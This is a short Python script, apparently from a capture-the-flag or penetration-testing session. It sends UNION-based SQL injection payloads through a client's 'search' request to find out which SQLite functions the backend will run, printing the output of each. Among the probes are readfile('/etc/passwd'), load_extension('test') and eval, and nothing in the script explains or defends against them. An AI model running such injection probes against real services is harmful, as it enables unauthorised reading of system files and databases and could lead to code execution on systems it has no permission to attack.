from client import GhostClient

c = GhostClient()
c.bootstrap()

funcs = [
    "sqlite_version()",
    "changes()",
    "total_changes()",
    "random()",
    "abs(-1)",
    "hex('abc')",
    "quote('abc')",
    "json('{\"a\":1}')",
    "json_extract('{\"a\":1}', '$.a')",
    "load_extension('test')",
    "readfile('/etc/passwd')",
    "edit('test')",
    "eval('1+1')",
    "glob('*', 'abc')",
    "like('%', 'abc')",
    "regexp('a', 'abc')",
    "randomblob(10)",
    "zero_blob(10)",
]

for f in funcs:
    q = f"' UNION SELECT 1, cast(({f}) as text), 3--"
    res = c.request("search", {"q": q})
    if res.get("ok"):
        rows = res["data"]["rows"]
        val = rows[0]["title"] if rows else "EMPTY"
        print(f"{f:35s} -> OK: {val}")
    else:
        print(f"{f:35s} -> ERR: {res.get('error')}")
